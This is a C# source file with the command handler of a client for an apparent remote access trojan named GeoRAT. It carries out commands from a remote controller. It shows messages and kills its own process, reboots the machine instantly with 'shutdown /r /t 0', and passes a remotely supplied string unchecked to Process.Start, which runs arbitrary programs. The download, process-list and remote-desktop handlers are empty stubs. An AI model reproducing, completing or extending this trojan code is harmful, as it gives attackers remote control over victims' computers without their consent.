using System;
using System.Diagnostics;
using GeoRAT.Core.Commands;


namespace GeoRAT.Client.CommandHandlers
{
    class CommandHandler
    {

      
        public void Handle(Commands command)
        {

            switch (command.CommandType)
            {
                case "Message":
                    Console.WriteLine("Message : " + Environment.NewLine);
                    Console.WriteLine("{0}", command.CommandParams + Environment.NewLine);
                    break;
                case "Disconnect":
                    Process.GetCurrentProcess().Kill();
                    break;
                case "Processes":

                    break;
                case "Restart":
                    Process.Start("shutdown", "/r /t 0");
                    break;
                case "OpenURL":
                    Console.WriteLine("Open website received, opening : {0}", command.CommandParams);
                    Process.Start(command.CommandParams);
                    break;
                case "Download":
                    break;
                case "Desktop":
                    Console.WriteLine("Remote desktop command received, sending desktop");
                  
                    break;

            }
        }


    }
}
